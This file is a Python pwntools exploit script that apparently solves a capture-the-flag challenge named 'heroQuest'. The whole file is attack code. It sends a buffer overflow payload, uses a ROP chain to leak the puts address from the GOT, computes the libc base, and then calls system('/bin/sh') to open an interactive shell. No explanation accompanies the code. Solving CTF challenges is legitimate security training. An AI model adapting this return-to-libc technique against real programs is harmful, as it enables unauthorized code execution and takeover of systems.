from pwn import *

context.binary = binary = './heroQuest'

elf = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process(binary)
# p = remote('tjc.tf', 31365)

if args.GDB:
	gdb.attach(p)

p.sendline(b'aaa')
sleep(0.1)
p.sendline(b'w')
sleep(0.1)
p.sendline(b'r')
sleep(0.1)

offset = 0x48 - 32
pop_rdi = 0x4017ab

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(elf.got.puts)
payload += p64(elf.plt.puts)
payload += p64(elf.symbols.game)

p.sendline(payload)

p.recvuntil(b'Enter the name for your save file: ')

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
print(hex(leak))

base = leak - libc.symbols.puts
print(hex(base))

system = base + libc.symbols.system
print(hex(system))

binsh = base + next(libc.search(b'/bin/sh\x00'))
print(hex(binsh))

p.sendline(b'w')
sleep(0.1)
p.sendline(b'r')
sleep(0.1)

payload1 = offset * b'B'
payload1 += p64(pop_rdi)
payload1 += p64(binsh)
payload1 += p64(0x401016) #stack align
payload1 += p64(system)

p.sendline(payload1)

p.interactive()